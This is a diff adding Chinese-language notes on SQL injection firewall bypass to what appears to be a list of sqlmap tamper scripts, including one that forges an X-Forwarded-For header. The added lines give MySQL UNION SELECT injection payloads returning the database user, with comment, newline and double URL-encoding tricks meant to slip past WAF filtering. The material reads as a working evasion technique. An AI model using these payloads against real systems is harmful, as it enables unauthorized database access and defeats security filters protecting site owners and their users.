@@ -503,5 +503,33 @@ versionedkeywords.py 用MySQL注释包围每个非函数关键字
 versionedmorekeywords.py 用MySQL注释包围每个关键字
 xforwardedfor.py 添加一个伪造的HTTP头“X-Forwarded-For”来绕过WAF
 
+mysql> select 1 from students where id='1--aa'union select user();
++----------------+
+| 1              |
++----------------+
+| 1              |
+| root@localhost |
++----------------+
+2 rows in set, 1 warning (0.01 sec)
+
+mysql> select 1 from students where id='1--aa'union #传递参数1--aa'union%0aselect user，如果waf删除注释--aa'union%0a则会产生绕过
+    -> select user();
++----------------+
+| 1              |
++----------------+
+| 1              |
+| root@localhost |
++----------------+
+2 rows in set, 1 warning (0.00 sec)
+
+select 1 from students where x=1 union %23 %250a x %0a select user() 
+#第一次解码后为，按照该解码结果去除注释后再匹配或者进行语法解析都是可以正常处理的
+mysql>select 1 from students where x=1 union # %0a x 
+    ->select user()
+#第二次解码后为，如果按照第二次解码后的结果进行语法解析，或者去除注释后再匹配都会失败
+mysql>select 1 from students where x=1 union # 
+    -> x 
+    ->select user()
+
 
 
